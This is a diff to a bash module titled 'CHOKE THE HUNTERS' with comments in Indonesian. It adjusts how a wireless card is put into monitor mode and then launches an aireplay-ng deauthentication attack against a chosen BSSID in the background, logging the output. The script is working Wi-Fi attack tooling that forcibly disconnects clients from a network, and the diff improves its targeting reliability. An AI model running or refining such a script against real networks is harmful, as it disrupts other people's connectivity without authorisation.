@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================
-#   MODULE: CHOKE THE HUNTERS (v6.0 Log Debug)
+#   MODULE: CHOKE THE HUNTERS (v6.1 Fix Target)
 # ============================================
 
 if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi
@@ -51,8 +51,12 @@ setup_monitor() {
     nmcli radio wifi off 2>/dev/null
     airmon-ng check kill >/dev/null 2>&1
     airmon-ng start "$IFACE" >/dev/null 2>&1
+    
+    # Paksa pake interface mon yang baru
     MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1)
-    if [ -z "$MON_IFACE" ]; then MON_IFACE="$IFACE"; fi
+    if [ -z "$MON_IFACE" ]; then MON_IFACE="${IFACE}mon"; fi # Fallback kalo misal namanya wlan0mon
+    if ! iw dev "$MON_IFACE" info >/dev/null 2>&1; then MON_IFACE="$IFACE"; fi # Kalo tetep gagal, balik ke awal
+    
     echo -e "\033[0;32m[+] Monitor Mode Aktif di: $MON_IFACE\033[0m"
 }
 
@@ -111,6 +115,7 @@ while true; do
             iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
             echo -e "\n${R}[*] Meluncurkan Deauth ke $BSSID...${N}"
+            # Jalanin di background, simpen log
             aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MON_IFACE" > /tmp/deauth_log.txt 2>&1 &
             DEAUTH_PID=$!
             
